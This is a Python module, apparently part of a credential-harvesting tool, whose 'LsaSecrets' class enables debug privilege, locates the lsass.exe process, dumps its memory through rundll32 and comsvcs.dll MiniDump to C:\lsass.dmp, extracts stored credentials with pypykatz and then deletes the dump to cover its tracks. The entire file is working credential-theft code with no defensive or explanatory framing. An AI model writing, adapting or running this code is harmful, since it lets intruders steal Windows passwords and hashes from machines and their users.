# -*- coding: utf-8 -*-
import os, subprocess, win32security, win32api, ctypes, psutil
from pypykatz.pypykatz import pypykatz


class disable_fsr:
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(self.old_value))

    def __exit__(self, type, value, traceback):
        if self.success:
            ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(self.old_value)


class LsaSecrets:
    def run(self, profile):
        if profile.get('lsa_secrets'):
            return profile['lsa_secrets']

        try:
            hToken = win32security.OpenThreadToken(win32api.GetCurrentThread(), win32security.TOKEN_ALL_ACCESS, True)
        except win32security.error:
            hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
        prev_state = ()
        new_state = [(win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME), win32security.SE_PRIVILEGE_ENABLED)]
        prev_state = win32security.AdjustTokenPrivileges(hToken, False, new_state)
        try:
            lsass_pid = 0
            for me in psutil.process_iter():
                try:
                    if me.exe().lower() == r'c:\windows\system32\lsass.exe':
                        lsass_pid = me.pid
                except:
                    pass
            if lsass_pid:
                with disable_fsr():
                    subprocess.Popen(
                        ['rundll32.exe', r'C:\Windows\System32\comsvcs.dll,', 'MiniDump', str(lsass_pid), r'C:\lsass.dmp', 'full'],
                        stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True, shell=True
                    ).communicate()
        finally:
            if prev_state:
                win32security.AdjustTokenPrivileges(hToken, False, prev_state)

        results = {}
        try:
            results = pypykatz.parse_minidump_file(r'C:\lsass.dmp')
            results.reader.reader.file_handle.close()
            results = results.to_dict()
            os.remove(r'C:\lsass.dmp')
        except Exception as e:
            pass

        return results


modules = {"LsaSecrets": LsaSecrets()}
